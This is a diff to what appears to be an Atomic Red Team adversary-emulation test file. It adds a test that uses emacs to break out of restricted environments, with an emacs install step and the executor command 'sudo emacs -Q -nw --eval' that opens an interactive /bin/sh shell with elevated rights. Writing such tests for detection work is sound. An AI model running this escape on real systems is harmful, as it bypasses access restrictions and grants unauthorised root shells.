@@ -278,3 +278,21 @@ atomic_tests:
     cleanup_command: 
     name: sh
     elevation_required: false  
+- name: emacs spawning an interactive system shell
+  description: |
+    emacs can be used to break out from restricted environments by spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/  
+  supported_platforms:
+  - linux
+  - macos
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if emacs is installed on the machine.
+    prereq_command: |
+      if [ -x "$(command -v emacs)" ]; then echo "emacs is installed"; else echo "emacs is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs
+  executor:
+    command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+    name: sh
+    elevation_required: true
